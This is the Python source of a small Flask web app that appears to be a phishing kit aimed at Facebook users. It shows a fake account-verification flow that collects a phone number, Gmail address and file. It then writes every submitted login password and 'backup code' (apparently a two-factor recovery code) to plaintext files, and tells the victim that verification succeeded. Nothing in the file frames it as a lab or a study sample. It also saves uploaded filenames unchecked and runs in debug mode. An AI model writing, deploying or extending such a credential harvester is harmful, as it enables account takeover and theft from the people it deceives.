from flask import Flask, render_template, request, redirect, url_for
import os
from datetime import datetime

app = Flask(__name__)

UPLOAD_FOLDER = 'submissions'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fb_number = request.form.get('fb_number')
    gmail = request.form.get('gmail')
    file = request.files.get('file')

    if not fb_number or not gmail or not file:
        return "All fields are required!", 400

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    safe_number = fb_number.replace(' ', '_')
    folder_path = os.path.join(UPLOAD_FOLDER, safe_number + '_' + timestamp)

    os.makedirs(folder_path, exist_ok=True)

    file_path = os.path.join(folder_path, file.filename)
    file.save(file_path)

    # Save text data
    with open(os.path.join(folder_path, 'info.txt'), 'w') as f:
        f.write(f"Facebook Number: {fb_number}\n")
        f.write(f"Gmail: {gmail}\n")

    return redirect(url_for('login_page'))

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        email_or_number = request.form.get('email_or_number')
        password = request.form.get('password')

        if not email_or_number or not password:
            return render_template('login.html', error="All fields are required.")

        # Save login info
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        login_file = os.path.join(UPLOAD_FOLDER, f"login_{timestamp}.txt")
        with open(login_file, 'w') as f:
            f.write(f"Email/Number: {email_or_number}\n")
            f.write(f"Password: {password}\n")

        if password.strip() != "":  # আপনি চাইলে এখানে পাসওয়ার্ড ভ্যালিডেশন করতে পারেন
            return redirect(url_for('backup_page'))
        else:
            return render_template('login.html', error="Incorrect login. Please try again.")

    return render_template('login.html')

@app.route('/backup', methods=['GET', 'POST'])
def backup_page():
    if request.method == 'POST':
        backup_code = request.form.get('backup_code')

        if not backup_code:
            return render_template('backup.html', error="Backup code is required.")

        # Save backup code
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        backup_file = os.path.join(UPLOAD_FOLDER, f"backup_{timestamp}.txt")
        with open(backup_file, 'w') as f:
            f.write(f"Backup Code: {backup_code}\n")

        return "✅ Verification process completed successfully."

    return render_template('backup.html')

if __name__ == '__main__':
    app.run(debug=True)
